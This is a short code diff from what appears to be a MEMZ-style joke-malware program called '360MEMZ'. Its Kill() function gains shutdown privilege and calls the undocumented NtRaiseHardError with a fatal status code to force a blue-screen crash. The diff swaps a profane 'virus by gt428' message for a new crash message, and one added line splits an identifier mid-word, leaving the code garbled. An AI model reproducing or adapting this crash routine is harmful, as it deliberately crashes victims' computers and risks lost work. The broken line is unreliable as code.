@@ -48,13 +48,15 @@ void Kill(){
 	system("stopworking.exe");
 	UNICODE_STRING str;
     HMODULE hDll = GetModuleHandle(TEXT("ntdll.dll"));
-    type_NtRaiseHardError NtRaiseHardError = (type_NtRaiseHardError)GetProcAddress(hDll, "NtRaiseHardError");
+    type_NtRaiseHardError NtRaiseHardError = (type_NtRaiseHardEr
+ror)GetProcAddress(hDll, "NtRaiseHardError");
  	type_RtlInitUnicodeString RtlInitUnicodeString = (type_RtlInitUnicodeString)GetProcAddress(hDll, "RtlInitUnicodeString");
  	
- 	RtlInitUnicodeString(&str, L"virus by gt428 fucked your computer so the"); 
+        // 31 chars
+ 	RtlInitUnicodeString(&str, L"Your computer is crashed by 360MEMZ and nothing else can happen now. Let's read the Chinese-unfriendly words below: "); 
  	ULONG x; 
  	BOOL bSuccess = SetPrivilege(SE_SHUTDOWN_NAME, TRUE);
- 	ULONG n[4] = {(ULONG)&str, 0xDEADDEAD, 0, 0};
+ 	ULONG n[4] = {(ULONG)&str, 0xDEADDEAD, 0x360DA1A0, 0xB111B111};
     if(bSuccess) NtRaiseHardError(0xC000021A, 4, 1, n, OptionShutdownSystem, &x);
     
     SetPrivilege(NULL, FALSE);
